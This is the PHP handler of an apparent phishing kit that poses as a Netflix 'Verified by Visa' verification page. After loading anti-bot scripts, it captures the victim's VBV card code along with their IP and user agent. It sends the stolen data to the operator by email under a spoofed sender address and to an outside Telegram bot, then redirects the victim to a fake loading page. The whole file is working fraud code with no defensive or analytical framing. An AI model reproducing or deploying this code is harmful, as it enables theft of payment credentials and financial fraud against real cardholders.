<?php

/* LI VBV */
/* SHISUI NTM BTW JREZ STEAL PAS SALOPE */
include('../tonmail.php');
include('../prevents/anti1.php');
include('../prevents/anti2.php');
include('../prevents/anti3.php');
include('../prevents/anti4.php');
include('../prevents/anti5.php');
include('../prevents/anti6.php');
include('../prevents/anti7.php');
include('../prevents/anti8.php');
if(isset($_POST['launch'])){


	session_start();
		

	$_SESSION['vbv_code'] = htmlspecialchars($_POST['vbv']);

if(!empty($_SESSION['vbv_code'])){

	$message = "

			

			🔒 CODE VBV : ".$_SESSION['vbv_code']."
			

			🔐 IP : ".$_SESSION['ip']."
			🗑 USER-AGENT : ".$_SESSION['useragent']."



			";



			$subject = "=?utf-8?Q?=E3=80=8C=F0=9F=94=92=E3=80=8D_-_VBV_-?= ".$_SESSION['vbv_code']." - ".$_SESSION['ip'];
			$headers = "From: =?utf-8?Q?=F0=9F=83=8F_AYOUB_=F0=9F=83=8F?= <log@netflixpardon.com>";

			mail($rezmail, $subject, $message, $headers);
	$data = [
       																'text' => "/============================\ 
       														🔥 New VBV 🔥 :
							🔒 CODE VBV : ".$_SESSION['vbv_code']."
			

							🔐 IP : ".$_SESSION['ip']."
							🗑 USER-AGENT : ".$_SESSION['useragent']."
/============================\ 



       																",
       																'chat_id' => $chat_id
																];

														file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );

			header('Location: ../steps/loading_finished.php');
		}
		else{

			header('Location: ../steps/authentification.php');


		}



}
else{


		header('Location: ../');

}


?>